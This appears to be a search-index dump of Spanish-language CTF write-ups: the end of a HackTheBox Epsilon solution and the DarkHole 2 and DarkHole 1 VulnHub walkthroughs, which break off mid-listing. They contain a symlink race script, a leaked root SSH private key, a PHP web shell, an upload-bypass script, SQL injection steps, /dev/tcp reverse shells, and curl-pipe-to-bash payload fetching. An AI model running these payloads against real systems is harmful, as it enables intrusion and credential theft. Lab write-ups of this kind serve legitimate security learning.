comprimidos de /var/www/app/ y el checksum, sin embargo, el checksum ya no será el sha1 del código original, sino que será la id_rsa de root pues la flag -h realiza el seguimiento al symlink.#!/bin/bashwhile true; do        if [ -e /opt/backups/checksum ]; then                rm /opt/backups/checksum                ln -s -f /root/.ssh/id_rsa /opt/backups/checksum                echo \"finalizado\"                break         fidonePara ello este script en bash borrará cualquier checksum que llegue y lo reemplazará por otro archivo llamado checksum que tendrá un symlink hacia la id_rsa de root. Vamos a ejecutarlo:tom@epsilon:/tmp$ ./test.shrm: remove write-protected regular file '/opt/backups/checksum'? yfinalizadotom@epsilon:/tmp$ cd /var/backups/web_backupstom@epsilon:/var/backups/web_backups$ ls224789875.tar  259999126.tartom@epsilon:/var/backups/web_backups$ cp 259999126.tar /tmptom@epsilon:/var/backups/web_backups$ cd /tmpCopiamos el último tar creado y lo llevamos a tmp para descomprimirlo:tom@epsilon:/tmp$ tar -xf 259999126.tarSi vemos el archivo:tom@epsilon:/tmp$ cd opttom@epsilon:/tmp/opt$ lsbackupstom@epsilon:/tmp/opt$ cd backups/tom@epsilon:/tmp/opt/backups$ ls245036605.tar  checksumtom@epsilon:/tmp/opt/backups$ cat checksum -----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----Observamos que al abrir el checksum, ya no es un sha1 del archivo tar original, sino la id_rsa de root debido al symlink. Con esto ahora solo falta copiarnosla y darle el privilegio 600 y entrar con ssh:nano id_rsachmod 600 id_rsassh -i id_rsa root@10.10.11.134root@epsilon:~# whoamirootHemos logrado entrar como el usuario root, vamos a buscarla la flag:root@epsilon:~# cat /root/root.txtfadbe3960616546fc32f5a2¡Listo! Hemos terminado la máquina.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "DarkHole 2 VulnHub Write-up",
    "url": "/posts/DarkHole_2/",
    "categories": "Write up, VulnHub",
    "tags": "Enumeration, Web, Git, Port forwarding, Information leakage, Abusing sudoers, SQLi, Linux, Easy",
    "date": "2023-02-22 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de VulnHub llamada DarkHole 2, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Reconocimiento d...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de VulnHub llamada DarkHole 2, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Reconocimiento del sistema.  Enumeración de proyecto Git.  SQLi.  Local Port Forwarding utilizando ssh.  Abuso de servidor web.  Información fitrada (bash history).  Abuso de privilegio de Sudoers.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión con la máquina utilizando ping:ping -c 1 192.168.233.130PING 192.168.233.130 (192.168.233.130) 56(84) bytes of data.64 bytes from 192.168.233.130: icmp_seq=1 ttl=64 time=0.266 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS -open 192.168.233.130 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpRealizamos un escaneo de los servicios expuestos utilizando nmap:nmap -sCV -p22,80 192.168.223.130 -Pn -oN ServiceScanComo resultado del escaneo tenemos:PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 57b1f564289891516d70766ea552435d (RSA)|   256 cc64fd7cd85e488a289891b9e41e6da8 (ECDSA)|_  256 9e7708a4529f338d9619ba757127bd60 (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set| http-git: |   192.168.233.130:80/.git/|     Git repository found!|     Repository description: Unnamed repository; edit this file 'description' to name the...|_    Last commit message: i changed login.php file for more secure |_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: DarkHole V2Observamos un servicio http, el cual tiene un repositorio de Git, vamos a utilizar whatweb para enumerar información:whatweb 192.168.233.130http://192.168.233.130 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.233.130], Title[DarkHole V2]Vamos a ver la web:Tenemos un panel de login, vamos a verlo:Antes de realizar intentos de SQLi, vamos a revisar el directorio .git:ExplotaciónVamos a traernos el proyecto a nuestro equipo utilizando git_dumper:python3 git_dumper.py http://192.168.233.130/.git darkhole2[-] Testing http://192.168.233.130/.git/HEAD [200][-] Testing http://192.168.233.130/.git/ [200][-] Fetching .git recursively[-] Fetching http://192.168.233.130/.git/ [200][-] Fetching http://192.168.233.130/.gitignore [404][-] http://192.168.233.130/.gitignore responded with status code 404[-] Fetching http://192.168.233.130/.git/hooks/ [200][-] Fetching http://192.168.233.130/.git/logs/ [200][-] Fetching http://192.168.233.130/.git/HEAD [200]Cuando termine, entramos a la carpeta que ha creado:lsconfig  dashboard.php  index.php  js  login.php  logout.php  styleObservamos todos los archivos del proyecto, si los revisamos encontraremos el panel de login:session_start();require 'config/config.php';if($_SERVER['REQUEST_METHOD'] == 'POST'){    $email = mysqli_real_escape_string($connect,htmlspecialchars($_POST['email']));    $pass = mysqli_real_escape_string($connect,htmlspecialchars($_POST['password']));    $check = $connect-&gt;query(\"select * from users where email='$email' and password='$pass' and id=1\");    if($check-&gt;num_rows){        $_SESSION['userid'] = 1;        header(\"location:dashboard.php\");        die();    }El cual implementa funciones para evitar las injecciones.Pero no encontramos más información, sin embargo, como es un proyecto de git vamos a ver si existen logs:commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -&gt; master)Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;Date:   Mon Aug 30 13:14:32 2021 +0300    i changed login.php file for more securecommit a4d900a8d85e8938d3601f3cef113ee293028e10Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;Date:   Mon Aug 30 13:06:20 2021 +0300    I added login.php file with default credentialscommit aa2a5f3aa15bb402f2b90a07d86af57436d64917Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;Date:   Mon Aug 30 13:02:44 2021 +0300    First InitializeSi existen, vemos un commit que dice que ha agregado al login una cuenta con credenciales por defecto, vamos a ver de que se trata:git show a4d900a8d85e8938d3601f3cef113ee293028e10commit a4d900a8d85e8938d3601f3cef113ee293028e10Author: Jehad Alqurashi &lt;anmar-v7@hotmail.com&gt;Date:   Mon Aug 30 13:06:20 2021 +0300    I added login.php file with default credentialsdiff --git a/login.php b/login.phpindex e69de29..8a0ff67 100644--- a/login.php+++ b/login.php@@ -0,0 +1,42 @@+&lt;?php+session_start();+require 'config/config.php';+if($_SERVER['REQUEST_METHOD'] == 'POST'){+    if($_POST['email'] == \"lush@admin.com\" &amp;&amp; $_POST['password'] == \"321\"){+        $_SESSION['userid'] = 1;+        header(\"location:dashboard.php\");+        die();+    }Vemos unas credenciales, vamos a probarlas en el panel de login.Al ingresar vemos:Vemos un panel, vamos a intentar algunas injecciones para ver si es vulnerable:Sin embargo, no logramos nada.En la URL podemos ver que se está utilizando un id para identificar el usuario, vamos a probar uno diferente:Vemos que si, vamos a analizar esto mejor en burpsuite:Como podemos saltar de id en id, tenemos un posible campo de injección, asi que vamos a probar SQLi:Vemos que al agregar una comilla, da página da error, vamos a probar a enumerar las columnas:Vemos que ha dado error, vamos a ir bajando el valor de las columnas. (en URL encode porque es una dirección url y no funciona en caso contrario.)Luego de ir bajando el valor llegamos a 6, en el cual ya no da error. Por lo tanto, nos hace pensar que este es el número de columnas que tiene la tabla, vamos a probarlo:Vemos que ha funcionado, dentro de los imput se ven reflejados los numeros que hemos seleccionado, por lo tanto, vamos a enumerar la base de datos:Vemos que la base de datos se llama darkhole_2, vamos a enumerar las tablas:Observamos que hay una tabla llamada ssh, vamos a ver las columnas que tiene:Vemos que hay una columna id, sin embargo, nos hace pensar que falta información, para ello utilizaremos group_concat para forzar a que toda la información aparezca en la misma linea:Vemos que existen las columnas id, user y pass, vamos a extraer la información:Tenemos unas credenciales jehad y passowrd fool, como la tabla se llama ssh nos hace pensar que corresponde a un usuario válido, vamos a probarlo:ssh jehad@192.168.233.130jehad@darkhole:~$ whoamijehadLogramos iniciar sesión correctamente por ssh en la máquina.Vamos a buscar la flag:jehad@darkhole:/home/losy$ cat user.txt DarkHole{'This_is_the_life_man_better_than_a_cruise'}¡Bien!, tenemos la flag de usuario, ahora vamos a escalar privilegios.Escalada de privilegiosVamos a empezar enumerando nuestro grupo y privilegios:jehad@darkhole:/home/losy$ iduid=1001(jehad) gid=1001(jehad) groups=1001(jehad)Para los permisos:jehad@darkhole:/home/losy$ sudo -l[sudo] password for jehad: Sorry, user jehad may not run sudo on darkhole.Pero no encontramos nada. Si buscamos por binarios SUID:jehad@darkhole:/home/losy$ find / -perm 4000 2&gt;/dev/nulljehad@darkhole:/home/losy$No tenemos nada, vamos a buscar por tareas cron:# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )* * * * * root service apache2 start &amp;&amp; service mysql start* * * * * losy  cd /opt/web &amp;&amp; php -S localhost:9999Y vemos algo interesante, tenemos lo que parece ser un servidor web por el puerto 9999 por parte de losy, vamos a traernos este puerto a nuestro equipo para ver de que se trata, esto lo haremos haciendo port forwarding utilizando ssh:ssh -L 9999:127.0.0.1:9999 jehad@192.168.233.130De esta forma, convertimos nuestro puerto 9999 en el puerto de la máquina víctima, vamos a ver que es:Vemos que pide un parámetro cmd, al parecer podemos ingresar comandos:Tenemos entonces, una forma de ejectuar comandos como el usuario losy, vamos a ganar acceso como losy:http://localhost:9999/?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/192.168.233.129/1234 0&gt;%261'Vamos a enviarnos una bash hacia nuestra máquina, utilizando el /dev/tcp, con ello entonces vamos a estar escuchando por netcat por el puerto 1234:nc -nvlp 1234listening on [any] 1234 ...connect to [192.168.233.128] from (UNKNOWN) [192.168.233.130] 55314bash: cannot set terminal process group (1266): Inappropriate ioctl for devicebash: no job control in this shelllosy@darkhole:/opt/web$ whoami  whoamilosyHemos ganado acceso como el usuario losy, vamos a arreglar la bash:  script /dev/null -c bash  control + z  stty ray -echo; fg  reset xterm  export TERM=xterm  export SHELL=bash  stty rows X columns Y (dependiendo de tu stty size)Con esto listo, ya podemos movernos con comodidad.Si nos vamos al directorio personal de losy, encontraremos algo interesante:losy@darkhole:~$ ls -latotal 36drwxr-xr-x 4 losy losy 4096 Feb 24 16:44 .drwxr-xr-x 5 root root 4096 Sep  2  2021 ..-rw------- 1 losy losy 1123 Sep  3  2021 .bash_history-rw-r--r-- 1 losy losy  220 Sep  2  2021 .bash_logout-rw-r--r-- 1 losy losy 3771 Sep  2  2021 .bashrcdrwx------ 2 losy losy 4096 Sep  2  2021 .cachedrwxrwxr-x 3 losy losy 4096 Sep  3  2021 .local-rw-r--r-- 1 losy losy  807 Sep  2  2021 .profile-rw-rw-r-- 1 losy losy   55 Sep  3  2021 user.txtVemos el bash history, si le echamos un ojo y vamos revisando las lineas encontramos lo siguiente:P0assw0rd losy:gangParece ser la contraseña de losy, vamos a intentar cambiar de usuario:jehad@darkhole:/home/losy$ su losyPassword: losy@darkhole:~$ whoamilosyAhora nos hemos convertido en losy, y tenemos sus credenciales, vamos a ver los privilegios que tenemos:losy@darkhole:~$ sudo -l[sudo] password for losy: Matching Defaults entries for losy on darkhole:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser losy may run the following commands on darkhole:    (root) /usr/bin/python3Podemos ejecutar python con privilegios, esto es crítico, pues podemos ganar acceos al sistema como root facilmente:losy@darkhole:~$ sudo /usr/bin/python3Python 3.8.10 (default, Nov 14 2022, 12:59:47) [GCC 9.4.0] on linuxType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(\"bash -p\")root@darkhole:/home/losy# whoamirootroot@darkhole:/home/losy# Nos hemos convertido en root, pues mediante python utilizando la librería os podemos ejecutar comandos en el sistema.Vamos a buscar la flag:root@darkhole:~# cat root.txt DarkHole{'Legend'}¡Listo! Hemos terminado la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "DarkHole 1 VulnHub Write-up",
    "url": "/posts/DarkHole_1/",
    "categories": "Write up, VulnHub",
    "tags": "Enumeration, Web, Abusing sesion system, SUID, Mail abusing, Path hijacking, Autopwn, Linux, Easy",
    "date": "2023-02-20 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de VulnHub llamada DarkHole 1, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del ...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de VulnHub llamada DarkHole 1, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema.  Abuso de mala implementación de sesiones.  Subida de archivo malicioso php a la web (extension filter bypass).  Abuso de binario SUID (path hijacking).  Abuso de archivo SUID.  Automatización de la intrusión con python.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión con la máquina utilizando ping:ping -c 1 192.168.233.129PING 192.168.233.129 (192.168.233.129) 56(84) bytes of data.64 bytes from 192.168.233.129: icmp_seq=1 ttl=64 time=5.95 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS -open 192.168.233.129 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT   STATE SERVICE22/tcp open  ssh80/tcp open  httpRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p22,80 192.168.233.129Como resultado del escaneo tenemos:PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 e450d9505d913050e9b57dcab051db74 (RSA)|   256 730c76866063060021c236203b99c1f7 (ECDSA)|_  256 54534c3f4f3a26f602aa9a24ea1b928c (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: DarkHoleMAC Address: 00:0C:29:16:4F:CB (VMware)Observamos un servicio http, vamos a utilizar whatweb para enumerar información:whatweb 192.168.233.129http://192.168.233.129 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.233.129], Title[DarkHole]Vamos a ver la web:Observamos la página, el botón no hace nada, sin embargo, la sección de login si:Vemos una sección de registro vamos a intentar registrarnos:Iniciamos sesión:Luego, de iniciar sesión vemos lo siguiente:Tenemos algunas partes para cambiar información, pero si miramos la url:http://192.168.233.129/dashboard.php?id=2Vemos que se está empleando un id, esto debe ser para identificar los usuarios, como somos el dos es lógico pensar que el uno existe, vamos a intentar ingresar:Sin embargo, no podemos.ExplotaciónVamos a probar las opciones de cambio de contraseña, vamos a interceptar la petición con burpsuite:Vemos que la petición por post se envía a través con un id, que representa al usuario, así que vamos a cambiar este id para el usuario 1:Si esto funcionó, debimos cambiarle la contraseña al id 1, podríamos pensar que este identificador corresponde al de administrador, pues es el primer usuario en crearse, vamos a intentar iniciar sesión con admin:Al intentarlo:Vemos que hemos iniciado sesión correctamente, y existe un panel donde podemos un archivo.Si el sistema para subir archivos no se encuentra hecho correctamente podríamos ser capaces de subir un archivo php malicioso, que nos permita ejectuar comandos en la máquina, vamos a intentar subir un txt con la palabra hola:Al enviarlo:Vemos que se ha enviado correctamente, sin embargo, no tenemos una forma de saber donde se están almacenando los archivos, para ellos a fuzzear directorios para ver si existe algún directorio que nos sirva:wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://192.168.233.129/FUZZY encontramos algo:000000366:   301        9 L      28 W       319 Ch      \"upload\"Existe un directorio upload, vamos a verlo:Aquí se guardan las cosas que subimos, podemos observar que está nuestro archivo de prueba:Vamos a intentar subir un archivo php malicioso que nos permita controlar mediante una variable cmd los comandos que queremos ejectuar en el sistema:&lt;?phpecho \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt;Vamos a poner esto en nuestro archivo de subirlo:Al subirlo:Nos dice que no permite la subida de esos archivos.Podemos pensar algunas maneras de realizar un bypass, en caso de que este sea la verificación de la extensión, por ejemplo, en la web de HackTricks podemos ver que existen diferentes extensiones que podemos utilizar para pasar por el filtro, vamos a probarlas todas, sin embargo, como son bastantes lo haremos mediante python para hacerlo menos tedioso.En primer lugar, vamos a definir nuestras variables:url = \"http://192.168.233.129/dashboard.php?id=1\"urlLogin= \"http://192.168.233.129/login.php\"extensions= [\".php\", \".php2\", \".php3\", \".php4\", \".php5\", \".php6\", \".php7\", \".phps\", \".phps\", \".pht\", \".phtm\", \".phtml\", \".pgif\", \".shtml\", \".htaccess\", \".phar\", \".inc\", \".hphp\", \".ctp\", \".module\"]s = requests.Session()Luego, tenemos nuestra función para iniciar sesión:def login():    post_data = {         \"username\": \"admin\",        \"password\": \"test\"     }    r = s.post(urlLogin,data=post_data)Finalemnte, tenemos nuestra función que subirá nuestro payload con las diferentes extesiones que definimos anteriormente:def upload():    for ext in extensions:        payload = \"\"\"  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt; \"\"\"         files  = {'fileToUpload':(f'shell{ext}',payload)            }        r = s.post(url,files=files)Al ejecutar este código, nos vamos a ver las uploads:Observamos que se han subido los archivos con todas las extensiones, vamos a revisarlos uno por uno.Después de revisarlos y ver que todos no están siendo interpretados, llegamos al .phtml:Puede ser que el código se esté interpretando, vamos a intentar ejectuar whoami:Vemos que tenemos ejecución remota de comandos, vamos a crear entonces una conexión hacia nuestra máquina para ganar acceso al sistema.Vamos a compartir un archivo index.html malicioso, que haciendo uso del /dev/tcp nos envíe una conexión hacia nuestra máquina, estaremos compartiendo este archivo haciendo uso de un servidor http con python, mientras estaremos conexión con netcat. Dentro del parámetro cmd haremos una petición a nuestro recurso y lo vamos a pipear con bash para así ejecutar su contenido.El archivo html malicioso es este:#!/bin/bashbash -i &gt;&amp; /dev/tcp/192.168.233.128/1234 0&gt;&amp;1Vamos a dejar abiertos el servidor en python y el netcat.Vamos a ingresar la petición a la página:192.168.233.129/upload/shell.phtml?cmd=curl%20192.168.233.128%20|%20bashSi vemos nuestro servidor en python:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...192.168.233.129 - - [20/Feb/2023 15:21:53] \"GET / HTTP/1.1\" 200 -Vemos la petición get, y si vemos netcat:nc -nvlp 1234listening on [any] 1234 ...connect to [192.168.233.128] from (UNKNOWN) [192.168.233.129] 60212bash: cannot set terminal process group (88930): Inappropriate ioctl for devicebash: no job control in this shellbash-5.0$ whoamiwhoamiwww-dataHemos ganado acceso al sistema, sin embargo, no tenemos privilegio alguno, vamos a tener que escalar.Escalada de privilegiosAntes de todo necesitamos una tty decente, asi que vamos a hacer lo siguiente:  script /dev/null -c bash  control + z  stty ray -echo; fg  reset xterm  export TERM=xterm  export SHELL=bash  stty rows X columns Y (dependiendo de tu stty size)Bien, con la consola lista vamos a escalar privilegios.En primer lugar, revisamos todos los archivos de la web por si encontramos algo, pero no vamos a encontrar nada.Vamos a dirigirnos a los directorios de los usuarios por si encontramos información:bash-5.0$ cd /homebash-5.0$ lsdarkhole  johnbash-5.0$ cd john/bash-5.0$ lsfile.py  password  toto  user.txtVemos diferentes archivos dentro del directorio de john, vamos a ver los permisos:bash-5.0$ ls -latotal 72drwxrwxrwx 5 john john      4096 Feb 20 17:02 .drwxr-xr-x 4 root root      4096 Jul 16  2021 ..-rw------- 1 john john      2139 Feb 20 17:00 .bash_history-rw-r--r-- 1 john john       220 Jul 16  2021 .bash_logout-rw-r--r-- 1 john john      3771 Jul 16  2021 .bashrcdrwx------ 2 john john      4096 Jul 17  2021 .cachedrwxrwxr-x 3 john john      4096 Jul 17  2021 .local-rw------- 1 john john        37 Jul 17  2021 .mysql_history-rw-r--r-- 1 john john       807 Jul 16  2021 .profiledrwxrwx--- 2 john www-data  4096 Jul 17  2021 .ssh-rwxrwx--- 1 john john        43 Feb 20 17:02 file.py-rwxrwx--- 1 john john         8 Jul 17  2021 password-rwsr-xr-x 1 root root     16784 Jul 17  2021 toto-rw-rw---- 1 john john        24 Jul 17  2021 user.txtVemos un archivo password que no podemos ver, existe un archivo toto que podemos ejecutar:bash-5.0$ file totototo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5f55e5cb083b2207ed23fc83f2dbf1cba931c868, for GNU/Linux 3.2.0, not strippedVemos que es un binario SUID, vamos a ver que hace:./totouid=1001(john) gid=33(www-data) groups=33(www-data)Si abrimos el binario, por supuesto es ilegible, pero si utilizamos strings podemos ver palabras:bash-5.0$ strings toto/lib64/ld-linux-x86-64.so.2libc.so.6setuidsystem__cxa_finalizesetgid__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu+UH[]A\\A]A^A_:*3$\"GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0Vemos un par de cosas interesantes, pero nada crítico.Vemos que este binario se comporta como el id, vamos a hacer una prueba, pues puede ser que este binario este utilizando este comando de forma relativa y no absoluta, en este caso podríamos realizar un cambio de path, en donde vamos a hacer que este archivo se ejecute y busque el comando id y use el que nosotros queremos, como el usuario que lo ejecuta es root, como es SUID, deberíamos ganar acceso como el. Lo haremos de la siguiente forma.Vamos a ir al directorio tmp y crearemos un archivo, el cual se ejecutaría como si fuera un archivo en bash:bash-5.0$ cd /tmpbash-5.0$ echo \"bash -p\" &gt; idbash-5.0$ cat idbash -pVemos que hemos creado un archivo id, el cual en caso de ejecutarse nos daría una bash con privilegios.Vamos a darle permisos de ejecución.bash-5.0$ chmod +x idBien, ahora tenemos esto listo, sin embargo, como haces que ejecute este archivo? para eso haremos una modifición a la variable de entorno PATH, en donde se empiezan a buscar todos los binarios, para ello vamos a introducir la dirección tmp como primera opción, por lo tanto, en caso de que se esté aplicando una ruta relativa, vaya al path y ejecute nuestro binario, pues es el primero que va a encontrar.bash-5.0$ export PATH=/tmp:$PATH bash-5.0$ echo $PATH/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binBien, con todo esto listo vamos a probarlo:bash-5.0$ ./totobash-5.0$ whoamijohnVemos que ahora somos john, sin embargo, deberiamos ser root. Esto paso debido a que si vemos bien los strings del archivo toto se le hace un setuid y setgid:setuidsystem__cxa_finalizesetgidEn esta parte debe estar dandole la propiedad a john. Sin embargo, nos sirve pues ahora tenemos más privilegios.Vamos a revisar el archivo password que no podíamos antes:bash-5.0$ cat passwordroot123Vemos la contraseña, debe ser de nuestro usuario. Vamos a ver nuestro privilegios:bash-5.0$ sudo -l[sudo] password for john: Matching Defaults entries for john on darkhole:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser john may run the following commands on darkhole:    (root) /usr/bin/python3 /home/john/file.pyVemos que podemos ejectuar como root el archivo file.py, vamos a verlo.bash-5.0$ ls -latotal 72drwxrwxrwx 5 john john      